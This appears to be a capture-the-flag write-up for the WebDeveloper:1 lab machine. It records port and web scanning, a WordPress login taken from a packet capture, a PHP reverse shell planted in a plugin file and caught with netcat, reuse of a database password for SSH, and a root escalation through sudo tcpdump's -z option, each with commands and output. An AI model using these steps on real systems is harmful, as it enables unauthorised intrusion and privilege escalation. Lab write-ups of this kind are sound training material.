@@ -1,0 +1,255 @@
+WebDeveloper:1 is a intermediate boot2root machine.
+IP: 192.168.0.104
+
+Lets start off by scanning all the ports
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WebDeveloperCTF# nmap -A -T4 -p- 192.168.0.104
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 11:37 IST
+Nmap scan report for 192.168.0.104
+Host is up (0.0012s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 d2:ac:73:4c:17:ec:6a:82:79:87:5a:f9:22:d4:12:cb (RSA)
+|   256 9c:d5:f3:2c:e2:d0:06:cc:8c:15:5a:5a:81:5b:03:3d (ECDSA)
+|_  256 ab:67:56:69:27:ea:3e:3b:33:73:32:f8:ff:2e:1f:20 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: WordPress 4.9.8
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Example site &#8211; Just another WordPress site
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/22%OT=22%CT=1%CU=39982%PV=Y%DS=2%DC=T%G=Y%TM=5F6994B
+OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=A)OPS
+OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1
+OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A9D4%RUD=G)IE(R=Y%DFI=N%T=40
+OS:%CD=S)
+
+There are lot of things to look at,so lets do this one by one.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WebDeveloperCTF# nikto -h 192.168.0.104
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.104
++ Target Hostname:    192.168.0.104
++ Target Port:        80
++ Start Time:         2020-09-22 11:37:48 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'link' found, with contents: </index.php/wp-json/>; rel="https://api.w.org/"
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /: A Wordpress installation was found.
++ Cookie wordpress_test_cookie created without the httponly flag
++ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
++ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
++ /wp-login.php: Wordpress login found
++ 7918 requests: 0 error(s) and 16 item(s) reported on remote host
++ End Time:           2020-09-22 11:38:56 (GMT5.5) (68 seconds)
+----------------------------------------------------------------
+
+So /wp-links-opml.php revelas the wordpress version
+<!-- generator="WordPress/4.9.8" -->
+
+For directory busting I used dirb ->
+-> dirb http://192.168.0.104 /usr/share/wordlists/common.txt
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.0.100/ ----
++ http://192.168.0.100/index.php (CODE:301|SIZE:0)                                                                      
+==> DIRECTORY: http://192.168.0.100/ipdata/                                                                             
++ http://192.168.0.100/server-status (CODE:403|SIZE:301)                                                                
+==> DIRECTORY: http://192.168.0.100/wp-admin/                                                                           
+==> DIRECTORY: http://192.168.0.100/wp-content/                                                                         
+==> DIRECTORY: http://192.168.0.100/wp-includes/                                                                        
++ http://192.168.0.100/xmlrpc.php (CODE:405|SIZE:42)                                                                    
+                                                                                                                        
+---- Entering directory: http://192.168.0.100/ipdata/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                        
+---- Entering directory: http://192.168.0.100/wp-admin/ ----
++ http://192.168.0.100/wp-admin/admin.php (CODE:302|SIZE:0)                                                             
+==> DIRECTORY: http://192.168.0.100/wp-admin/css/                                                                       
+==> DIRECTORY: http://192.168.0.100/wp-admin/images/                                                                    
+==> DIRECTORY: http://192.168.0.100/wp-admin/includes/                                                                  
++ http://192.168.0.100/wp-admin/index.php (CODE:302|SIZE:0)                                                             
+==> DIRECTORY: http://192.168.0.100/wp-admin/js/                                                                        
+==> DIRECTORY: http://192.168.0.100/wp-admin/maint/                                                                     
+==> DIRECTORY: http://192.168.0.100/wp-admin/network/                                                                   
+^C> Testing: http://192.168.0.100/wp-admin/run
+
+As this is a wordpress site we can enumerate the users using wpscan.
+
+
+
+[i] User(s) Identified:
+
+[+] webdeveloper
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://192.168.0.104/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+
+
+User:webdeveloper
+
+http://192.168.0.100/ipdata/
+
+This directory contains analyze.cap file lets download this file and analyze it.
+We can open this file using wireshark and can find something interesting in it.
+I found /wp-login.php session and password used while loggin in.
+
+Form item: "log" = "webdeveloper"
+Form item: "pwd" = "Te5eQg&4sBS!Yr$)wf%(DcAd"
+
+Got password from the analyze file.
+
+Lets try to login to the wordpress site.
+I did login and then I copied php reverse shell into akismet/index.php.(I uploaded reverse shell from pentest monkey)
+
+And fired up netcat listener for incoming connections.
+
+And I got a shell
+C:\Users\Voker\Downloads\netcat-win32-1.12>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.0.106] from (UNKNOWN) [192.168.0.100] 47584
+Linux webdeveloper 4.15.0-38-generic #41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 13:09:42 up 49 min,  0 users,  load average: 0.00, 0.00, 0.14
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Lets try to make this shell stable by using python.
+
+python -c "import pty;pty.spawn('/bin/bash')"
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'webdeveloper');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'MasterOfTheUniverse');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8mb4');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+
+Password for database is MasterOfTheUniverse
+We can use this as ssh password for the user webdeveloper.
+
+root@LAPTOP-U5913CMD:/home/akshay# ssh webdeveloper@192.168.0.100
+The authenticity of host '192.168.0.100 (192.168.0.100)' can't be established.
+ECDSA key fingerprint is SHA256:qgNlWWIX9wv+iLg9Bqpq+ENCHqG3lhlsM1bMQJygYDM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.0.100' (ECDSA) to the list of known hosts.
+webdeveloper@192.168.0.100's password:
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-38-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Sep 22 13:17:38 UTC 2020
+
+  System load:  0.0                Processes:           103
+  Usage of /:   25.1% of 19.56GB   Users logged in:     0
+  Memory usage: 40%                IP address for eth0: 192.168.0.100
+  Swap usage:   0%
+
+
+*** System restart required ***
+Last login: Tue Oct 30 09:25:27 2018 from 192.168.1.114
+webdeveloper@webdeveloper:~$ id
+uid=1000(webdeveloper) gid=1000(webdeveloper) groups=1000(webdeveloper),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
+webdeveloper@webdeveloper:~$
+
+webdeveloper@webdeveloper:~$ sudo -l
+[sudo] password for webdeveloper:
+Sorry, try again.
+[sudo] password for webdeveloper:
+Matching Defaults entries for webdeveloper on webdeveloper:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webdeveloper may run the following commands on webdeveloper:
+    (root) /usr/sbin/tcpdump
+webdeveloper@webdeveloper:~$
+
+I got to know about this from gtfobins which is a great website if you wanna learn privilege escalation.
+
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+
+
+webdeveloper@webdeveloper:~$ echo $"id" > /tmp/.test
+webdeveloper@webdeveloper:~$ chmod +x /tmp/.test
+webdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+dropped privs to root
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+8 packets received by filter
+0 packets dropped by kernel
+webdeveloper@webdeveloper:~$ uid=0(root) gid=0(root) groups=0(root)
+
+webdeveloper@webdeveloper:~$
+
+
+webdeveloper@webdeveloper:~$ echo $"ls /root" > /tmp/.test
+webdeveloper@webdeveloper:~$ chmod +x /tmp/.test
+webdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+dropped privs to root
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+8 packets received by filter
+0 packets dropped by kernel
+webdeveloper@webdeveloper:~$ flag.txt
+
+webdeveloper@webdeveloper:~$ echo $"cat /root/flag.txt" > /tmp/.test
+webdeveloper@webdeveloper:~$ chmod +x /tmp/.test
+webdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+dropped privs to root
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+6 packets received by filter
+0 packets dropped by kernel
+webdeveloper@webdeveloper:~$ Congratulations here is youre flag:
+cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290
+
+Woah got it..
+
+Thank you..Happy Hacking :)
